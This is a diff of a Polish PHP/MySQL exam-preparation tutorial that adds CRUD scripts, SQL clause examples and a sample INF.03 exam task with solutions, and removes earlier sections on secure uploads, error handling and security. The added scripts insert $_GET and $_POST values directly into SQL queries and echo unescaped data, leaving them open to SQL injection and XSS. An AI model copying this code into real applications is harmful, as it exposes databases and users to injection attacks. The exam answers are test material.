+    $liczba_kolumn = mysqli_num_fields($wynik);
+    for ($i = 0; $i < $liczba_kolumn; $i++) {
+        echo "<th>Kolumna " . ($i + 1) . "</th>";
+    }
+    echo "</tr>";
+    
+    // Wyświetlanie wierszy
+    while ($wiersz = mysqli_fetch_row($wynik)) {
+        echo "<tr>";
+        for ($i = 0; $i < $liczba_kolumn; $i++) {
+            echo "<td>" . htmlspecialchars($wiersz[$i]) . "</td>";
+        }
+        echo "</tr>";
+    }
+    
+    echo "</table>";
+    
+    mysqli_close($conn);
+?>
+```
+
+### **Dodatkowe klauzule SQL (na egzaminie!)**
+
+#### **DISTINCT - unikalne wartości**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Pobierz wszystkie unikalne miasta klientów
+    $sql = "SELECT DISTINCT miasto FROM klienci ORDER BY miasto";
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<h3>Lista miast:</h3>";
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["miasto"] . "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Bez DISTINCT:**
+```
+Warszawa
+Kraków
+Warszawa
+Gdańsk
+Kraków
+```
+
+**Z DISTINCT:**
+```
+Gdańsk
+Kraków
+Warszawa
+```
+
+#### **UNION - łączenie wyników zapytań**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Połącz listę klientów i dostawców w jedną listę
+    $sql = "(SELECT imie, nazwisko, 'Klient' as typ FROM klienci)
+            UNION
+            (SELECT imie, nazwisko, 'Dostawca' as typ FROM dostawcy)
+            ORDER BY nazwisko";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"] . " " . $wiersz["nazwisko"] . " (" . $wiersz["typ"] . ")<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **BETWEEN - zakres wartości**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Produkty w przedziale cenowym 50-150 zł
+    $sql = "SELECT nazwa, cena FROM produkty WHERE cena BETWEEN 50 AND 150";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["nazwa"] . " - " . $wiersz["cena"] . " zł<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **IN - wartość z listy**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Produkty z wybranych kategorii
+    $sql = "SELECT * FROM produkty WHERE kategoria IN ('elektronika', 'AGD', 'RTV')";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["nazwa"] . "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **Praktyczny przykład - kompletny system CRUD (styl proceduralny)**
+
+#### **Struktura bazy danych**
+
+Najpierw stwórz bazę w phpMyAdmin:
+
+```sql
+CREATE DATABASE sklep;
+USE sklep;
+
+CREATE TABLE produkty (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    nazwa VARCHAR(100) NOT NULL,
+    cena DECIMAL(10,2) NOT NULL,
+    ilosc INT NOT NULL,
+    data_dodania TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+#### **1. Dodawanie produktu (INSERT)**
+
+**dodaj_produkt.php:**
+```php
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dodaj produkt</title>
+</head>
+<body>
+    <h2>Dodaj nowy produkt</h2>
+    
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        // Połączenie z bazą
+        $conn = mysqli_connect("localhost", "root", "", "sklep");
+        
+        if (!$conn) {
+            die("Błąd połączenia: " . mysqli_connect_error());
+        }
+        
+        mysqli_set_charset($conn, "utf8");
+        
+        // Odbieranie danych z formularza
+        $nazwa = $_POST["nazwa"];
+        $cena = $_POST["cena"];
+        $ilosc = $_POST["ilosc"];
+        
+        // Zapytanie INSERT
+        $sql = "INSERT INTO produkty (nazwa, cena, ilosc) 
+                VALUES ('$nazwa', $cena, $ilosc)";
+        
+        if (mysqli_query($conn, $sql)) {
+            echo "<p style='color:green'>✅ Produkt dodany pomyślnie!</p>";
+        } else {
+            echo "<p style='color:red'>❌ Błąd: " . mysqli_error($conn) . "</p>";
+        }
+        
+        mysqli_close($conn);
+    }
+    ?>
+    
+    <form method="POST">
+        <label>Nazwa produktu:</label><br>
+        <input type="text" name="nazwa" required><br><br>
+        
+        <label>Cena (zł):</label><br>
+        <input type="number" step="0.01" name="cena" required><br><br>
+        
+        <label>Ilość:</label><br>
+        <input type="number" name="ilosc" required><br><br>
+        
+        <button type="submit">Dodaj produkt</button>
+    </form>
+    
+    <br>
+    <a href="lista_produktow.php">Pokaż wszystkie produkty</a>
+</body>
+</html>
+```
+
+#### **2. Wyświetlanie produktów (SELECT)**
+
+**lista_produktow.php:**
+```php
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lista produktów</title>
+    <style>
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #4CAF50; color: white; }
+        tr:hover { background-color: #f5f5f5; }
+    </style>
+</head>
+<body>
+    <h2>Lista produktów w sklepie</h2>
+    
+    <?php
+    // Połączenie z bazą
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    if (!$conn) {
+        die("Błąd połączenia: " . mysqli_connect_error());
+    }
+    
+    mysqli_set_charset($conn, "utf8");
+    
+    // Zapytanie SELECT
+    $sql = "SELECT * FROM produkty ORDER BY id DESC";
+    $wynik = mysqli_query($conn, $sql);
+    
+    // Sprawdzenie czy są wyniki
+    if (mysqli_num_rows($wynik) > 0) {
+        echo "<p>Liczba produktów: " . mysqli_num_rows($wynik) . "</p>";
+        
+        echo "<table>";
+        echo "<tr>";
+        echo "<th>ID</th>";
+        echo "<th>Nazwa</th>";
+        echo "<th>Cena</th>";
+        echo "<th>Ilość</th>";
+        echo "<th>Data dodania</th>";
+        echo "<th>Akcje</th>";
+        echo "</tr>";
+        
+        // Pętla WHILE - pobieranie każdego wiersza
+        while ($produkt = mysqli_fetch_array($wynik)) {
+            echo "<tr>";
+            echo "<td>" . $produkt["id"] . "</td>";
+            echo "<td>" . $produkt["nazwa"] . "</td>";
+            echo "<td>" . $produkt["cena"] . " zł</td>";
+            echo "<td>" . $produkt["ilosc"] . " szt.</td>";
+            echo "<td>" . $produkt["data_dodania"] . "</td>";
+            echo "<td>";
+            echo "<a href='edytuj_produkt.php?id=" . $produkt["id"] . "'>Edytuj</a> | ";
+            echo "<a href='usun_produkt.php?id=" . $produkt["id"] . "' 
+                     onclick='return confirm(\"Czy na pewno usunąć?\")'>Usuń</a>";
+            echo "</td>";
+            echo "</tr>";
+        }
+        
+        echo "</table>";
+    } else {
+        echo "<p>Brak produktów w bazie danych</p>";
+    }
+    
+    mysqli_close($conn);
+    ?>
+    
+    <br>
+    <a href="dodaj_produkt.php">Dodaj nowy produkt</a>
+</body>
+</html>
+```
+
+#### **3. Edycja produktu (UPDATE)**
+
+**edytuj_produkt.php:**
+```php
+<?php
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+mysqli_set_charset($conn, "utf8");
+
+// Pobierz ID produktu z URL
+$id = $_GET["id"];
+
+// Jeśli formularz wysłany - zaktualizuj dane
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $nazwa = $_POST["nazwa"];
+    $cena = $_POST["cena"];
+    $ilosc = $_POST["ilosc"];
+    
+    $sql = "UPDATE produkty SET nazwa='$nazwa', cena=$cena, ilosc=$ilosc WHERE id=$id";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "✅ Produkt zaktualizowany!<br>";
+        $zmienione = mysqli_affected_rows($conn);
+        echo "Liczba zaktualizowanych wierszy: $zmienione<br>";
+    } else {
+        echo "❌ Błąd: " . mysqli_error($conn);
     }
 }
+
+// Pobierz aktualne dane produktu
+$sql = "SELECT * FROM produkty WHERE id=$id";
+$wynik = mysqli_query($conn, $sql);
+$produkt = mysqli_fetch_array($wynik);
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Edytuj produkt</title>
+</head>
+<body>
+    <h2>Edytuj produkt</h2>
+    
+    <form method="POST">
+        <label>Nazwa:</label><br>
+        <input type="text" name="nazwa" value="<?php echo $produkt['nazwa']; ?>" required><br><br>
+        
+        <label>Cena:</label><br>
+        <input type="number" step="0.01" name="cena" value="<?php echo $produkt['cena']; ?>" required><br><br>
+        
+        <label>Ilość:</label><br>
+        <input type="number" name="ilosc" value="<?php echo $produkt['ilosc']; ?>" required><br><br>
+        
+        <button type="submit">Zapisz zmiany</button>
+    </form>
+    
+    <br>
+    <a href="lista_produktow.php">Powrót do listy</a>
+    
+    <?php mysqli_close($conn); ?>
+</body>
+</html>
 ```
 
-### Dodatkowe zabezpieczenia dla plików graficznych
+#### **4. Usuwanie produktu (DELETE)**
 
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<h4 style="margin-top: 0;">🔍 Dodatkowa walidacja obrazów</h4>
-<p style="color: #333333;">Dla obrazów warto dodać dodatkowe sprawdzenie czy plik faktycznie jest tym za co się podaje:</p>
-</div>
-
+**usun_produkt.php:**
 ```php
 <?php
-// Sprawdzanie czy plik jest faktycznie obrazem
-if (in_array($file_ext, ["jpg", "jpeg", "png", "gif"])) {
-    $image_info = getimagesize($file_tmp);
+// Połączenie z bazą
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+mysqli_set_charset($conn, "utf8");
 
-    if ($image_info === false) {
-        die("❌ Przesłany plik nie jest prawidłowym obrazem!");
+// Pobierz ID z URL
+$id = $_GET["id"];
+
+// Usuń produkt
+$sql = "DELETE FROM produkty WHERE id=$id";
+
+if (mysqli_query($conn, $sql)) {
+    $usuniete = mysqli_affected_rows($conn);
+    
+    if ($usuniete > 0) {
+        echo "✅ Produkt usunięty pomyślnie!<br>";
+        echo "Liczba usuniętych wierszy: $usuniete";
+    } else {
+        echo "⚠️ Nie znaleziono produktu o ID: $id";
     }
-
-    // Dodatkowe sprawdzenie typu MIME
-    $allowed_mime = ["image/jpeg", "image/png", "image/gif"];
-
-    if (!in_array($image_info["mime"], $allowed_mime)) {
-        die("❌ Nieprawidłowy typ obrazu!");
-    }
-
-    // Opcjonalnie: Zmiana rozmiaru obrazu
-    list($width, $height) = $image_info;
-
-    if ($width > 2000 || $height > 2000) {
-        // Tutaj kod do zmiany rozmiaru obrazu
-        echo "ℹ️ Obraz zostanie przeskalowany.";
-    }
-}
-?>
-```
-
-<table>
-  <tr>
-    <th>Bezpieczny upload plików</th>
-  </tr>
-  <tr>
-    <td>✅ Sprawdzaj rozszerzenie pliku</td>
-  </tr>
-  <tr>
-    <td>✅ Sprawdzaj rozmiar pliku</td>
-  </tr>
-  <tr>
-    <td>✅ Używaj unikalnych nazw plików</td>
-  </tr>
-  <tr>
-    <td>✅ Sprawdzaj typ MIME pliku</td>
-  </tr>
-  <tr>
-    <td>✅ Ogranicz liczbę przesyłanych plików</td>
-  </tr>
-  <tr>
-    <td>✅ Używaj folderów z ograniczonym dostępem</td>
-  </tr>
-  <tr>
-    <td>✅ Regularnie aktualizuj skrypty i biblioteki</td>
-  </tr>
-</table>
-
----
-
-## **12. Obsługa błędów - Debugowanie i zarządzanie problemami**
-
-<div style="background-color: #E0F7FA; border-left: 5px solid #00BCD4; padding: 10px;">
-<p style="color: #333333;">Profesjonalny kod PHP to nie tylko funkcjonalność, ale także odpowiednia obsługa błędów. Dobrze zaprojektowany system obsługi błędów pomaga w szybszym znajdowaniu i naprawianiu problemów.</p>
-</div>
-
-### Konfiguracja raportowania błędów
-
-```php
-<?php
-// TYLKO PODCZAS ROZWOJU - wyświetla wszystkie błędy
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-// W ŚRODOWISKU PRODUKCYJNYM - ukrywa błędy przed użytkownikami, ale zapisuje do logów
-error_reporting(E_ALL);
-ini_set('display_errors', 0);
-ini_set('log_errors', 1);
-ini_set('error_log', '/path/to/php-errors.log');
-?>
-```
-
-<table>
-  <tr>
-    <th>Stała raportowania</th>
-    <th>Co obejmuje?</th>
-  </tr>
-  <tr>
-    <td><code>E_ALL</code></td>
-    <td>Wszystkie błędy i ostrzeżenia</td>
-  </tr>
-  <tr>
-    <td><code>E_ERROR</code></td>
-    <td>Tylko błędy fatalne wykonania</td>
-  </tr>
-  <tr>
-    <td><code>E_WARNING</code></td>
-    <td>Ostrzeżenia wykonania (niekrytyczne błędy)</td>
-  </tr>
-  <tr>
-    <td><code>E_NOTICE</code></td>
-    <td>Powiadomienia o nieoptymalnym kodzie</td>
-  </tr>
-  <tr>
-    <td><code>E_STRICT</code></td>
-    <td>Sugestie poprawności kodu</td>
-  </tr>
-</table>
-
-### Try-Catch - Obsługa wyjątków
-
-```php
-<?php
-// Obsługa wyjątków pozwala na eleganckie radzenie sobie z błędami
-try {
-    // Potencjalnie problematyczny kod
-    $plik = "dane.txt";
-
-    if (!file_exists($plik)) {
-        throw new Exception("Plik $plik nie istnieje!");
-    }
-
-    $dane = file_get_contents($plik);
-
-    if ($dane === false) {
-        throw new Exception("Nie można odczytać pliku $plik!");
-    }
-
-    echo "Sukces! Odczytano " . strlen($dane) . " bajtów.";
-
-} catch (Exception $e) {
-    // Kod obsługi błędu
-    echo "❌ Błąd: " . $e->getMessage();
-
-    // Zapis szczegółów do pliku logów
-    error_log("Błąd odczytu pliku: " . $e->getMessage());
-
-} finally {
-    // Ten kod wykona się zawsze, niezależnie czy wystąpił błąd czy nie
-    echo "<br>Operacja pliku zakończona.";
-}
-?>
-```
-
-### Własna obsługa błędów
-
-```php
-<?php
-// Definiowanie własnej funkcji obsługi błędów
-function mojaObslugaBledu($errno, $errstr, $errfile, $errline) {
-    // Formatowanie wiadomości o błędzie
-    $errorMessage = date("Y-m-d H:i:s") . " - Błąd [$errno]: $errstr w pliku $errfile, linia $errline\n";
-
-    // Zapis do logu
-    error_log($errorMessage, 3, "moje-bledy.log");
-
-    // Informacja dla użytkownika końcowego (bez szczegółów technicznych)
-    if (in_array($errno, [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
-        echo "<div style='color: red; border: 1px solid red; padding: 5px;>
-              Wystąpił krytyczny błąd. Administrator został powiadomiony.</div>";
-    }
-
-    // Czy pozwolić standardowej obsłudze błędów na kontynuację?
-    // return false; // zatrzymuje domyślną obsługę
-    return true; // pozwala na domyślną obsługę
-}
-
-// Rejestracja funkcji obsługi błędów
-set_error_handler("mojaObslugaBledu");
-
-// Testowy błąd
-echo $nieistniejaca_zmienna; // Wygeneruje błąd
-?>
-```
-
-<div style="background-color: #FFF3CD; border-left: 5px solid #FFC107; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ Najważniejsze zasady obsługi błędów</h4>
-<ul style="color: #333333;">
-<li>Nigdy nie pokazuj szczegółów technicznych błędów użytkownikom</li>
-<li>Zawsze rejestruj (loguj) błędy w produkcji</li>
-<li>Używaj try-catch do obsługi przewidywalnych błędów</li>
-<li>Tworząc własne wyjątki, dziedzicz po klasie Exception</li>
-<li>Dbaj o przyjazne komunikaty dla użytkowników</li>
-</ul>
-</div>
-
----
-
-## **13. Przydatne funkcje - Narzędzia na co dzień**
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-PHP udostępnia bogaty zestaw wbudowanych funkcji, które przyspieszają codzienną pracę programisty. Oto kilka najważniejszych kategorii.
-</div>
-
-### Walidacja danych - Sprawdzanie poprawności
-
-```php
-<?php
-// Walidacja adresu email
-$email = "uzytkownik@domena.pl";
-if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    echo "✅ Email jest poprawny<br>";
 } else {
-    echo "❌ Niepoprawny format adresu email<br>";
+    echo "❌ Błąd: " . mysqli_error($conn);
 }
 
-// Walidacja URL
-$url = "https://www.example.com";
-if (filter_var($url, FILTER_VALIDATE_URL)) {
-    echo "✅ URL jest poprawny<br>";
-}
-
-// Walidacja liczb całkowitych w zakresie
-$wiek = 25;
-$opcje = [
-    "options" => [
-        "min_range" => 18,
-        "max_range" => 65
-    ]
-];
-
-if (filter_var($wiek, FILTER_VALIDATE_INT, $opcje)) {
-    echo "✅ Wiek w dozwolonym zakresie<br>";
-}
-
-// Sanityzacja danych (usuwanie potencjalnie niebezpiecznych elementów)
-$niebezpiecznyHTML = "<script>alert('XSS')</script>Tekst ze skryptem";
-$bezpiecznyTekst = filter_var($niebezpiecznyHTML, FILTER_SANITIZE_STRING);
-echo "Bezpieczny tekst: $bezpiecznyTekst<br>"; // Wyświetli tylko: Tekst ze skryptem
+mysqli_close($conn);
 ?>
+
+<br><br>
+<a href="lista_produktow.php">Powrót do listy produktów</a>
 ```
 
-### Praca z datami i czasem
+### **Przykład z JOIN - zamówienia i klienci**
+
+Załóżmy że mamy dwie tabele:
+
+```sql
+CREATE TABLE klienci (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    imie VARCHAR(50),
+    email VARCHAR(100)
+);
+
+CREATE TABLE zamowienia (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    klient_id INT,
+    produkt VARCHAR(100),
+    cena DECIMAL(10,2),
+    data_zamowienia TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+**Wyświetlanie zamówień z danymi klientów:**
 
 ```php
 <?php
-// Aktualna data i czas
-echo "Teraz jest: " . date("Y-m-d H:i:s") . "<br>";
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+mysqli_set_charset($conn, "utf8");
 
-// Formatowanie daty
-echo "Data polska: " . date("d.m.Y") . "<br>";
-echo "Data amerykańska: " . date("m/d/Y") . "<br>";
-echo "Dzień tygodnia: " . date("l") . "<br>";
-echo "Miesiąc: " . date("F") . "<br>";
+// JOIN - połączenie tabel
+$sql = "SELECT klienci.imie, klienci.email, 
+               zamowienia.produkt, zamowienia.cena, zamowienia.data_zamowienia
+        FROM zamowienia
+        INNER JOIN klienci ON zamowienia.klient_id = klienci.id
+        ORDER BY zamowienia.data_zamowienia DESC";
 
-// Obliczenia na datach
-$jutro = time() + (24 * 60 * 60); // +1 dzień w sekundach
-echo "Jutro będzie: " . date("Y-m-d", $jutro) . "<br>";
+$wynik = mysqli_query($conn, $sql);
 
-// Timestamp dla określonej daty
-$timestamp = strtotime("2023-12-31");
-echo "Sylwester: " . date("d.m.Y", $timestamp) . "<br>";
+echo "<h2>Historia zamówień</h2>";
+echo "<table border='1'>";
+echo "<tr><th>Klient</th><th>Email</th><th>Produkt</th><th>Cena</th><th>Data</th></tr>";
 
-// Obliczanie różnicy między datami
-$data1 = new DateTime("2023-01-01");
-$data2 = new DateTime("2023-12-31");
-$roznica = $data1->diff($data2);
-echo "Różnica: " . $roznica->days . " dni<br>";
-
-// Dodawanie i odejmowanie okresów czasu
-$data = new DateTime(); // teraz
-$data->add(new DateInterval("P1M")); // dodaj 1 miesiąc
-echo "Za miesiąc będzie: " . $data->format("Y-m-d") . "<br>";
-?>
-```
-
-<table>
-  <tr>
-    <th>Symbol formatu daty</th>
-    <th>Znaczenie</th>
-    <th>Przykład</th>
-  </tr>
-  <tr>
-    <td><code>Y</code></td>
-    <td>Rok (4 cyfry)</td>
-    <td>2023</td>
-  </tr>
-  <tr>
-    <td><code>m</code></td>
-    <td>Miesiąc (2 cyfry)</td>
-    <td>01-12</td>
-  </tr>
-  <tr>
-    <td><code>d</code></td>
-    <td>Dzień miesiąca (2 cyfry)</td>
-    <td>01-31</td>
-  </tr>
-  <tr>
-    <td><code>H</code></td>
-    <td>Godzina w formacie 24h</td>
-    <td>00-23</td>
-  </tr>
-  <tr>
-    <td><code>i</code></td>
-    <td>Minuty</td>
-    <td>00-59</td>
-  </tr>
-  <tr>
-    <td><code>s</code></td>
-    <td>Sekundy</td>
-    <td>00-59</td>
-  </tr>
-</table>
-
-### JSON - Wymiana danych
-
-```php
-<?php
-// Konwersja tablicy PHP na JSON
-$dane = [
-    "imie" => "Jan",
-    "wiek" => 30,
-    "email" => "jan@example.com",
-    "aktywny" => true,
-    "hobby" => ["sport", "książki", "podróże"]
-];
-
-// Konwersja na JSON
-$json = json_encode($dane, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-echo "<pre>$json</pre>";
-
-// Konwersja JSON z powrotem na tablicę PHP
-$json_string = '{"produkt":"Laptop","cena":3499.99,"dostepny":true}';
-$produkt = json_decode($json_string, true); // true = konwersja na tablicę asocjacyjną
-
-echo "Produkt: " . $produkt["produkt"] . "<br>";
-echo "Cena: " . $produkt["cena"] . " zł<br>";
-echo "Dostępność: " . ($produkt["dostepny"] ? "Na magazynie" : "Niedostępny") . "<br>";
-
-// Sprawdzanie błędów JSON
-if (json_last_error() !== JSON_ERROR_NONE) {
-    echo "Błąd parsowania JSON: " . json_last_error_msg();
-}
-?>
-```
-
-### Inne przydatne funkcje
-
-```php
-<?php
-// Generowanie unikalnego identyfikatora
-$unique_id = uniqid("prefix_", true);
-echo "Unikalny ID: $unique_id<br>";
-
-// Skrót MD5 (np. do sum kontrolnych plików)
-$md5 = md5("tekst do zahashowania");
-echo "MD5: $md5<br>";
-
-// Hashowanie haseł (ZAWSZE używaj dla haseł!)
-$haslo = "moje_tajne_haslo123";
-$hash = password_hash($haslo, PASSWORD_DEFAULT);
-echo "Bezpieczny hash: $hash<br>";
-
-// Weryfikacja hasła
-if (password_verify($haslo, $hash)) {
-    echo "✅ Hasło poprawne - logowanie udane";
-} else {
-    echo "❌ Niepoprawne hasło";
+while ($zamowienie = mysqli_fetch_array($wynik)) {
+    echo "<tr>";
+    echo "<td>" . $zamowienie["imie"] . "</td>";
+    echo "<td>" . $zamowienie["email"] . "</td>";
+    echo "<td>" . $zamowienie["produkt"] . "</td>";
+    echo "<td>" . $zamowienie["cena"] . " zł</td>";
+    echo "<td>" . $zamowienie["data_zamowienia"] . "</td>";
+    echo "</tr>";
 }
 
-// Random - generowanie losowych liczb
-$losowa = rand(1, 100); // liczba od 1 do 100
-echo "Wylosowana liczba: $losowa<br>";
+echo "</table>";
 
-// Zaokrąglanie liczb
-echo round(3.49) . "<br>";  // 3
-echo round(3.50) . "<br>";  // 4
-echo ceil(3.01) . "<br>";   // 4 (zawsze w górę)
-echo floor(3.99) . "<br>";  // 3 (zawsze w dół)
+mysqli_close($conn);
 ?>
 ```
 
 ---
 
-## **14. Podstawy bezpieczeństwa - Ochrona aplikacji**
+## **11b. PRZYKŁADOWE ZADANIE EGZAMINACYJNE INF.03 (JAK WYGLĄDA PRAWDZIWY EGZAMIN)**
 
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0;">🔒 Bezpieczeństwo to priorytet!</h4>
-<p style="color: #333333;">Bezpieczeństwo aplikacji webowych jest krytycznie ważne - jeden błąd może prowadzić do wycieku danych, utraty zaufania użytkowników i poważnych konsekwencji prawnych.</p>
-</div>
+### **Struktura zadania egzaminacyjnego**
 
-### Najczęstsze zagrożenia dla aplikacji PHP
+Egzamin INF.03 trwa **150 minut** i składa się z kilku części:
 
-<table>
-  <tr>
-    <th>Zagrożenie</th>
-    <th>Opis</th>
-    <th>Ochrona</th>
-  </tr>
-  <tr>
-    <td><b>SQL Injection</b></td>
-    <td>Wstrzyknięcie złośliwego kodu SQL poprzez dane wejściowe</td>
-    <td>Prepared Statements, walidacja danych</td>
-  </tr>
-  <tr>
-    <td><b>XSS (Cross-Site Scripting)</b></td>
-    <td>Wstrzyknięcie złośliwego JavaScript na stronę</td>
-    <td>htmlspecialchars(), sanityzacja danych wyjściowych</td>
-  </tr>
-  <tr>
-    <td><b>CSRF (Cross-Site Request Forgery)</b></td>
-    <td>Wykonanie akcji w imieniu użytkownika bez jego wiedzy</td>
-    <td>Tokeny CSRF, sprawdzanie referer</td>
-  </tr>
-  <tr>
-    <td><b>Niebezpieczny Upload</b></td>
-    <td>Przesłanie złośliwych plików na serwer</td>
-    <td>Walidacja plików, zmiana nazw, odpowiednie uprawnienia</td>
-  </tr>
-  <tr>
-    <td><b>Session Hijacking</b></td>
-    <td>Kradzież identyfikatora sesji</td>
-    <td>httponly cookies, regeneracja ID sesji</td>
-  </tr>
-</table>
+**1. Operacje na bazie danych (phpMyAdmin) - ~30 pkt**
+- 4-5 zapytań SQL do wykonania
+- INSERT, UPDATE, DELETE, SELECT
+- Często z JOIN, GROUP BY, funkcjami agregującymi
+- MUSISZ zapisać wyniki do pliku `kwerendy.txt` + zrzuty ekranu
 
-### Ochrona przed XSS (Cross-Site Scripting)
+**2. Strona internetowa (HTML + CSS + PHP) - ~50 pkt**
+- Struktura HTML5 (header, nav, section, footer)
+- Formularz z polami różnych typów
+- Stylizacja CSS (zewnętrzny plik)
+- Skrypty PHP łączące się z bazą
+- Wyświetlanie danych w tabelach
 
+**3. Grafika (GIMP/Photoshop) - ~20 pkt**
+- Przeskalowanie obrazu
+- Odbicie lustrzane
+- Dodanie tekstu/logo
+- Zmiana formatu
+
+### **Przykład zadania - Portal firmowy**
+
+**Zadanie 4** - *Na podstawie udostępnionej bazy danych i materiałów wykonaj portal firmowy.*
+
+#### **Część 1: Operacje w bazie danych (phpMyAdmin)**
+
+**Baza danych:** `firma.sql` (import do phpMyAdmin)
+
+**Tabele:**
+- `pracownicy` (id, imie, nazwisko, stanowisko, pensja, data_zatrudnienia)
+- `projekty` (id, nazwa, budzet, data_rozpoczecia, pracownik_id)
+
+**Zadanie 4.1** *(8 pkt)* Napisz i wykonaj zapytanie SQL, które wyświetli imię, nazwisko i stanowisko wszystkich pracowników zatrudnionych po 2020 roku, posortowanych alfabetycznie według nazwiska.
+
+**Rozwiązanie:**
+```sql
+SELECT imie, nazwisko, stanowisko 
+FROM pracownicy 
+WHERE YEAR(data_zatrudnienia) > 2020 
+ORDER BY nazwisko ASC;
+```
+
+**Zadanie 4.2** *(8 pkt)* Napisz i wykonaj zapytanie SQL, które policzy ile projektów prowadzi każdy pracownik. Wyświetl imię, nazwisko pracownika oraz liczbę projektów. Pokaż tylko pracowników z więcej niż 2 projektami.
+
+**Rozwiązanie:**
+```sql
+SELECT pracownicy.imie, pracownicy.nazwisko, COUNT(projekty.id) as liczba_projektow
+FROM pracownicy
+INNER JOIN projekty ON pracownicy.id = projekty.pracownik_id
+GROUP BY pracownicy.id
+HAVING liczba_projektow > 2;
+```
+
+**Zadanie 4.3** *(6 pkt)* Dodaj nowy projekt o nazwie "Portal E-commerce", budżecie 150000 zł, przypisany do pracownika o ID=3.
+
+**Rozwiązanie:**
+```sql
+INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
+VALUES ('Portal E-commerce', 150000, CURRENT_DATE(), 3);
+```
+
+**Zadanie 4.4** *(8 pkt)* Zaktualizuj pensję wszystkich programistów, zwiększając ją o 10%.
+
+**Rozwiązanie:**
+```sql
+UPDATE pracownicy 
+SET pensja = pensja * 1.10 
+WHERE stanowisko = 'programista';
+```
+
+**⚠️ WAŻNE - MUSISZ:**
+1. Wykonać każde zapytanie w phpMyAdmin
+2. Zrobić **zrzut ekranu** wyniku (nazwa: `kwerenda1.png`, `kwerenda2.png`, etc.)
+3. Zapisać wszystkie zapytania do pliku **`kwerendy.txt`**
+
+**Plik kwerendy.txt:**
+```
+-- Zadanie 4.1
+SELECT imie, nazwisko, stanowisko 
+FROM pracownicy 
+WHERE YEAR(data_zatrudnienia) > 2020 
+ORDER BY nazwisko ASC;
+
+-- Zadanie 4.2
+SELECT pracownicy.imie, pracownicy.nazwisko, COUNT(projekty.id) as liczba_projektow
+FROM pracownicy
+INNER JOIN projekty ON pracownicy.id = projekty.pracownik_id
+GROUP BY pracownicy.id
+HAVING liczba_projektow > 2;
+
+-- Zadanie 4.3
+INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
+VALUES ('Portal E-commerce', 150000, CURRENT_DATE(), 3);
+
+-- Zadanie 4.4
+UPDATE pracownicy 
+SET pensja = pensja * 1.10 
+WHERE stanowisko = 'programista';
+```
+
+#### **Część 2: Strona internetowa**
+
+**Zadanie 4.5** *(20 pkt)* Stwórz stronę `index.php` zawierającą:
+- Nagłówek z logo firmy
+- Formularz dodawania nowego projektu (nazwa, budżet, wybór pracownika z listy)
+- Tabelę wyświetlającą wszystkie projekty z danymi pracowników
+
+**index.php:**
+```php
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Portal Firmowy</title>
+    <link rel="stylesheet" href="styl.css">
+</head>
+<body>
+    <header>
+        <img src="logo.png" alt="Logo">
+        <h1>Portal Zarządzania Projektami</h1>
+    </header>
+    
+    <section id="formularz">
+        <h2>Dodaj nowy projekt</h2>
+        <form method="POST" action="dodaj.php">
+            <label>Nazwa projektu:</label>
+            <input type="text" name="nazwa" required><br>
+            
+            <label>Budżet (zł):</label>
+            <input type="number" name="budzet" required><br>
+            
+            <label>Pracownik odpowiedzialny:</label>
+            <select name="pracownik_id" required>
+                <?php
+                $conn = mysqli_connect("localhost", "root", "", "firma");
+                $sql = "SELECT id, imie, nazwisko FROM pracownicy";
+                $wynik = mysqli_query($conn, $sql);
+                
+                while ($pracownik = mysqli_fetch_array($wynik)) {
+                    echo "<option value='" . $pracownik["id"] . "'>";
+                    echo $pracownik["imie"] . " " . $pracownik["nazwisko"];
+                    echo "</option>";
+                }
+                
+                mysqli_close($conn);
+                ?>
+            </select><br>
+            
+            <button type="submit">Dodaj projekt</button>
+        </form>
+    </section>
+    
+    <section id="lista">
